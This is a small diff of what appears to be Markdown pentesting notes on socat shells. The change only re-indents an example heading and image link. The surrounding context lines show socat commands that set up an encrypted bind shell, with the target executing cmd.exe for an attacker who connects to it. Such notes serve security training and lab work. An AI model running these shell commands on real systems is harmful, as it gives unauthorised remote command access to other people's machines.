@@ -73,5 +73,5 @@ Steps to use the feature:
   - Target: `socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes`
   - Attacker: `socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -`
 
-  ### Example: (attacker< >target)
-  ![image](https://github.com/user-attachments/assets/8992c65c-aead-4452-bb6a-aeea142ae7a9)
+    ### Example: (attacker< >target)
+    ![image](https://github.com/user-attachments/assets/8992c65c-aead-4452-bb6a-aeea142ae7a9)
